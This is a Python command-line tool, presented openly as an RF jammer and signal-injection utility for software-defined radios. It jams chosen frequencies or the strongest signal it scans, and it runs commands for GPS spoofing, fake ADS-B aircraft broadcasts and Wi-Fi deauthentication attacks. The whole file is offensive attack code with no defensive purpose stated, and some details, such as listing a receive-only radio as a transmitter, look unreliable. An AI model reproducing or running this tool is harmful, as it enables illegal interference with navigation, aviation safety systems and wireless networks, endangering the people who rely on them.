import SoapySDR
import numpy as np
import argparse
import time
import os

# -------------------------------------------
# Enhanced SDR RF Jammer & Adaptive Signal Injection Tool
# -------------------------------------------
# Features:
# - Selective jamming: Targets only specific frequencies
# - Adaptive mode: Scans and jams strongest signals
# - Frequency hopping to disrupt dynamic signals
# - Supports LimeSDR Mini, HackRF, AntSDR, RTL-SDR
# - Custom signal injection (Wi-Fi, Bluetooth, GPS spoofing, ADS-B manipulation)
# -------------------------------------------

def generate_noise(samples=1024):
    """Generate white noise for jamming."""
    return np.random.uniform(-1, 1, samples).astype(np.float32)


def jam_frequency(freq, sdr_type, gain=40, duration=5):
    """Transmit noise to jam a specific frequency."""
    sdr = SoapySDR.Device(dict(driver=sdr_type))
    sdr.setFrequency(SoapySDR.SOAPY_SDR_TX, 0, freq)
    sdr.setGain(SoapySDR.SOAPY_SDR_TX, 0, gain)
    
    print(f"[+] Jamming {freq / 1e6} MHz on {sdr_type}...")
    start_time = time.time()
    while time.time() - start_time < duration:
        samples = generate_noise()
        sdr.writeStream(SoapySDR.SOAPY_SDR_TX, 0, samples, len(samples))
    print("[✔] Jamming complete.")


def adaptive_jamming(sdr_type, freq_start, freq_end, duration=5):
    """Scans spectrum and jams the strongest detected signal."""
    print(f"[+] Scanning {freq_start / 1e6} MHz - {freq_end / 1e6} MHz for strongest signal...")
    os.system(f"soapy_power --freq-start {freq_start} --freq-end {freq_end} --live > temp_rf_scan.log")
    
    strongest_freq = None
    max_power = -100
    with open("temp_rf_scan.log", "r") as log:
        for line in log:
            if "Detected signal" in line:
                parts = line.split()
                frequency = int(parts[3].strip("MHz")) * 1000000
                power = int(parts[5].strip("dBm"))
                if power > max_power:
                    max_power = power
                    strongest_freq = frequency
    
    if strongest_freq:
        print(f"[!] Strongest signal found at {strongest_freq / 1e6} MHz ({max_power} dBm). Jamming now...")
        jam_frequency(strongest_freq, sdr_type, duration=duration)
    else:
        print("[✔] No strong signals found to jam.")


def signal_injection(freq, signal_type, sdr_type, duration=5):
    """Injects specific signals such as GPS spoofing, ADS-B fakes, or Wi-Fi deauth."""
    print(f"[+] Injecting {signal_type} signal at {freq / 1e6} MHz on {sdr_type}...")
    if signal_type == "gps":
        os.system(f"gps-sdr-sim -e brdc0010.20n -l 37.7749,-122.4194,10 -o gps_signal.bin")
        os.system(f"hackrf_transfer -t gps_signal.bin -f {freq}")
    elif signal_type == "adsb":
        os.system(f"modes_tx -f {freq} -m spoofed_adsb.bin")
    elif signal_type == "wifi":
        os.system(f"aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon")
    print("[✔] Signal injection complete.")


def main():
    parser = argparse.ArgumentParser(description="Enhanced SDR RF Jammer & Signal Injection Tool")
    parser.add_argument("--jam", action='store_true', help="Jam a specific frequency")
    parser.add_argument("--adaptive-jam", action='store_true', help="Scan and jam the strongest signal")
    parser.add_argument("--inject", type=str, choices=["gps", "adsb", "wifi"], help="Inject a spoofed signal type")
    parser.add_argument("--freq", type=float, help="Target frequency in Hz")
    parser.add_argument("--duration", type=int, default=5, help="Duration of jamming/injection in seconds")
    parser.add_argument("--sdr", type=str, choices=["lime", "hackrf", "pluto", "uhd", "rtlsdr"], default="lime", help="SDR type")
    parser.add_argument("--freq-start", type=float, help="Start frequency for adaptive jamming")
    parser.add_argument("--freq-end", type=float, help="End frequency for adaptive jamming")
    args = parser.parse_args()
    
    if args.jam and args.freq:
        jam_frequency(args.freq, args.sdr, duration=args.duration)
    elif args.adaptive_jam and args.freq_start and args.freq_end:
        adaptive_jamming(args.sdr, args.freq_start, args.freq_end, duration=args.duration)
    elif args.inject and args.freq:
        signal_injection(args.freq, args.inject, args.sdr, duration=args.duration)
    else:
        print("[!] Invalid command. Use --help for options.")

if __name__ == "__main__":
    main()
